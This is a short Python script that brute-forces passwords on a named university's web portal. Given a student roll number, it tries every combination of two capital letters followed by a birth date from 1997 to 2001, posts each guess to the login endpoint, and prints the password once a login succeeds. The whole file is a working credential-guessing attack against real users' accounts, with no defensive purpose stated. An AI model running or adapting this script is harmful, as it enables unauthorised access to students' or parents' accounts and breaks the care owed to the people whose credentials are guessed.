import sys
import requests
from bs4 import BeautifulSoup as bs
from datetime import date, timedelta

url='https://webkiosk.thapar.edu/CommonFiles/UserAction.jsp'
alphabets = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'

def connect(url, m_data):
	# print("requesting data:")
	resp = requests.post(url, data=m_data)
	# print("parsing data:")
	soup = bs(resp.text, 'html.parser')
	# print("checking data:")
	x = soup.find_all('frame')
	if(len(x) != 0):
		print("Password is " + m_data["Password"])
		sys.exit()
	# print("done")

def controller():
	roll_no = sys.argv[1]
	length = 26 ** 2
	if len(sys.argv) > 2:
		date_obs = lambda: [sys.argv[2]]
	else:
		d1 = date(1997, 1, 1)
		d2 = date(2001, 12, 31)
		date_obs = lambda: ('{:%d%m%Y}'.format(d1 + timedelta(days=x)) for x in range((d2 - d1).days + 1))
		length *= (365 * 5) + 1
	psswds = (M + D + date_ob for M in alphabets for D in alphabets for date_ob in date_obs())
	for i, psswd in enumerate(psswds):
		print(f'\rTrying {psswd} | {i + 1} of {length}', end='', flush=True)
		connect(url, {
			'UserType' : 'P',
			'MemberCode' : roll_no,
			'Password' : psswd
		})

controller()